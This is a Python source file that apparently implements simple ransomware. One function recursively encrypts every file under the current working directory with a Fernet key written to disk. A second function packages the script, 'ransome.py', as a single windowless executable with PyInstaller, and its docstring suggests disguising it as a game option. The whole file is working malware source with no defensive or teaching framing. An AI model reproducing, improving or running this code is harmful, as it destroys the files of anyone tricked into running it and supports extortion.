def rans():
    import os
    import sys
    from cryptography.fernet import Fernet

    # Function to generate and save the key
    def generate_key():
        key = Fernet.generate_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(key)

    # Function to load the existing key
    def load_key():
        return open("thekey.key", "rb").read()

    # Function to encrypt a file
    def encrypt_file(file_name, key):
        try:
            with open(file_name, "rb") as file:
                file_data = file.read()

            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(file_data)

            with open(file_name, "wb") as file:
                file.write(encrypted_data)
            print(f"File {file_name} encrypted successfully.")
    
        except FileNotFoundError:
            print(f"Error: File {file_name} not found.")

    # Function to recursively encrypt all files in a directory (including subdirectories)
    def encrypt_all_files_in_directory(directory, key):
        # Walk through the directory and encrypt each file
        for foldername, subfolders, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                encrypt_file(file_path, key)

    # Main Program
    # Step 1: Check if the encryption key exists
    if not os.path.exists("thekey.key"):
        print("Key not found, generating a new key...")
        generate_key()
    else:
        print("Key found, loading the key...")

    # Load the key
    key = load_key()

    # Step 2: Encrypt all files in the current directory (and subdirectories)
    directory = os.getcwd()  # Get the current working directory
    encrypt_all_files_in_directory(directory, key)

# Define the create_exe function
def create_exe():
    import subprocess
    import sys
    """Function to create an .exe using PyInstaller when the user selects the game option."""
    print("Building the executable...")

    try:
        result = subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'ransome.py'], check=True, stdout=subprocess.PIPE , stderr=subprocess.PIPE)
        
        # Print the output of PyInstaller
        print("PyInstaller Output:")
        print(result.stdout.decode())
        print(result.stderr.decode())
        
        print("Executable created successfully!")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while creating the executable: {e}")
        print("Detailed error output:")
        print(e.stderr.decode())
